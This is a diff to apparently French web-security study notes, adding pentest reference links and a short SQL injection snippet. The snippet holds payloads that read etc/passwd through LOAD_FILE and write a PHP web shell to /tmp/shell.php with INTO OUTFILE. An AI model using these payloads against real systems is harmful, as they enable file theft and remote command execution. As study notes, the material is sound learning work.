@@ -3,6 +3,7 @@
 - [OWASP Cheatsheet Series - Top 10][https://cheatsheetseries.owasp.org/IndexTopTen.html]
 - [Mozilla Client Docs](https://developer.mozilla.org/en-US/doc)
 - [Top 10 PortSwigger 2023](https://portswigger.net/polls/top-10-web-hacking-techniques-2023)
+- https://book.hacktricks.xyz/todo/other-web-tricks
 
 ## Outils
 
@@ -123,6 +124,7 @@ et `.htaccess`
 BEUST: Blind,Error,Union,Stacked,Time-based
 
   - https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/
+  - https://pentestmonkey.net/cheat-sheet/sql-injection/
   - https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
   - https://www.invicti.com/blog/web-security/fragmented-sql-injection-attacks/
   - https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/
@@ -139,6 +141,20 @@ BEUST: Blind,Error,Union,Stacked,Time-based
 
  ' union select id, origine, message, 0 from chall #
 ```
+
+#### R/W file
+
+```
+# Read file
+UNION SELECT LOAD_FILE ("etc/passwd")-- 
+
+# Write a file
+UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
+```
+
+#### RCE - GCC extension
+
+- https://pentestmonkey.net/category/tools/audit
 
 `Protection`: [quoted & prepared statements](https://phpdelusions.net/mysqli_examples/prepared_select)
 
@@ -260,6 +276,10 @@ Voir aussi `elements`
 `getElements`
 
 - https://www.w3schools.com/js/tryit.asp?filename=tryjs_dom_getelementsbytagname
+
+### Reverse Tabnabbing
+
+- https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing
 
 ### XSS
 
